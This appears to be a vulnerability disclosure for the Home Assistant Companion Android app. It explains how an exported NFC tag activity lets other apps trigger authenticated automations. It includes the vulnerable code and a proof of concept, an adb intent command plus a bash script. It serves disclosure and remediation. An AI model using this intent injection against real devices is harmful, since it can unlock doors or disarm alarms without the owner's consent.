### Summary
An exported activity privilege escalation vulnerability exists in `TagReaderActivity` within the Home Assistant Companion Android app. The activity is exported without permission protection or caller verification, allowing any unprivileged third-party application installed on the same device to trigger authenticated Home Assistant automations. This allows a malicious actor to control physical security devices (e.g., locks, alarms) using the victim's stored credentials without any user interaction.

### Details
The vulnerability is located in `io.homeassistant.companion.android.nfc.TagReaderActivity`. This component is declared in the `AndroidManifest.xml` with an intent filter for `ACTION_VIEW` and `https://www.home-assistant.io/tag/` URLs. It is exported (`android:exported="true"`) but lacks signature-level permissions or runtime caller validation.

**Vulnerable Code**: In `TagReaderActivity.onCreate`, the app processes the Intent immediately. It extracts the tag ID, and if the user is logged in (normal state), it executes an authenticated API call to the Home Assistant server.

```
// io.homeassistant.companion.android.nfc.TagReaderActivity.kt

override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    lifecycleScope.launch {
        // Validation of Action only, no validation of Sender
        if (intent.action == NfcAdapter.ACTION_NDEF_DISCOVERED || intent.action == Intent.ACTION_VIEW) {
            val url = if (isNfcTag) {
                NFCUtil.extractUrlFromNFCIntent(intent)
            } else {
                intent.data
            }
            try {
                // Flow proceeds to handleTag
                handleTag(url, isNfcTag) 
            } catch (e: Exception) {
                showProcessingError(isNfcTag)
            }
        }
        finish()
    }
}

private suspend fun handleTag(url: Uri?, isNfcTag: Boolean) {
    val nfcTagId = UrlUtil.splitNfcTagId(url)
    
    // If app is configured (serverManager.isRegistered()), the attack succeeds
    if (nfcTagId != null && serverManager.isRegistered()) {
        serverManager.defaultServers.map {
            lifecycleScope.async {
                try {
                    // Authenticated API call with attacker-controlled ID
                    serverManager.integrationRepository(it.id)
                        .scanTag(hashMapOf("tag_id" to nfcTagId))
                } catch (e: Exception) {
                    // ...
                }
            }
        }.awaitAll()
    } 
}
```

**Security Flaws**:
1. **Improper Export**: The activity is accessible to all other apps.
2. **No Caller Verification**: It does not check getCallingUid() to ensure the Intent originated from the system NFC service or the app itself.
3. **Silent Execution**: The attack occurs in the background (or momentarily in foreground) without requiring the user to tap a physical tag.

### PoC
**Prerequisites**:
- Target device has Home Assistant Companion installed and logged in.
- Attacker has ADB access OR a malicious app installed on the device.

**Reproduction Steps (ADB)**: Run the following command to simulate a malicious app sending a crafted intent. Replace attacker-controlled-id with a Tag ID that triggers an automation in your Home Assistant instance.

```
adb shell am start -n io.homeassistant.companion.android/io.homeassistant.companion.android.nfc.TagReaderActivity \
-a android.intent.action.VIEW \
-d "https://www.home-assistant.io/tag/attacker-controlled-id"
```

**Reproduction Steps (Bash Script)**: This script verifies the vulnerability by checking for the "Tag scanned to HA successfully" log entry.

```
#!/bin/bash
# Exploit for exported TagReaderActivity
COMPONENT="io.homeassistant.companion.android/io.homeassistant.companion.android.nfc.TagReaderActivity"
TAG_ID="poc_test_tag"
TAG_URL="https://www.home-assistant.io/tag/$TAG_ID"

echo "[*] Launching vulnerable activity..."
adb logcat -c
adb shell am start -n "$COMPONENT" -a android.intent.action.VIEW -d "$TAG_URL"

echo "[*] Checking logs..."
sleep 2
adb logcat -d | grep "TagReaderActivity" | grep "Tag scanned to HA successfully"
```

**Observation**: The log will show `Tag scanned to HA successfully`, and any automation linked to `poc_test_tag` will execute on the server.

### Impact
**Type**: Privilege Escalation / Remote Command Execution via Intent
**Impacted Users**: All Android users who have the Companion App installed and configured.

This vulnerability breaches the integrity of the smart home environment. It allows a low-privilege malicious app to:
1. **Bypass Physical Controls**: Unlock doors, open garage doors, or disarm security systems if these are linked to NFC tags.
2. **Trigger Automations**: Execute any server-side automation associated with a tag ID.
3. **Use Stored Credentials**: The attacker does not need the user's password; they leverage the app's existing authenticated session.

CWEs involved: CWE-926, CWE-862 (secondary)
CVSS scoring ~7.0-8.0 (High)
